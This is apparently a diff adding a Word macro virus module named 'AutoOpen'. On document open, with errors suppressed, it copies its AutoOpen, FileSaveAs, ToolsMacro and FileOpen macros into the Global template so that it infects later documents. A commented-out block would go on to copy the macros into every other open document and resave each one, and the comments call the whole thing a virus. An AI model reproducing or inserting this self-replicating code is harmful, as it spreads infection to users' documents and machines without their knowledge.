@@ -1,0 +1,36 @@
+   Attribute VB_Name = "AutoOpen"
+
+   Public Sub MAIN()
+   Attribute MAIN.VB_Description = "Run when file is opened"
+   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
+   Dim MyFile$
+       On Error Resume Next
+       ' when this document is opened, copy the FileSaveAs macro to the
+       ' Global Macros
+       MyFile$ = WordBasic.[FileName$]()
+       WordBasic.MacroCopy MyFile$ + ":AutoOpen", "Global:AutoOpen"
+       WordBasic.MacroCopy MyFile$ + ":FileSaveAs", "Global:FileSaveAs"
+       WordBasic.MacroCopy MyFile$ + ":ToolsMacro", "Global:ToolsMacro"
+       WordBasic.MacroCopy MyFile$ + ":FileOpen", "Global:FileOpen"
+       ' I'd like to go through the list of open documents
+       ' and spread the virus there as well
+       ' store the name of the Windows Just Opened
+   '   NewFile$ = MyFile$
+   '   For C = 1 To CountWindows() - 1
+   '       WindowList C
+   '       MyFile$ = FileNameFromWindow$(C)
+   '       If MyFile$ <> "" And MyFile$ <> NewFile$ Then
+   '           MacroCopy "Global:AutoOpen", MyFile$ + ":AutoOpen"
+   '           MacroCopy "Global:FileSaveAs", MyFile$ + ":FileSaveAs"
+   '           MacroCopy "Global:ToolsMacro", MyFile$ + ":ToolsMacro"
+   '           MacroCopy "Global:FileOpen", MyFile$ + ":FileOpen"
+   '           FileSaveAs .Name = MyFile$, .Format = 1
+   '       EndIf
+   '   Next C
+   '   ' Now set the focus back to new window
+   '   For C = 1 To CountWindows()
+   '       If NewFile$ = FileNameFromWindow$(C) Then
+   '       WindowList C
+   '   Next C
+
+   End Sub
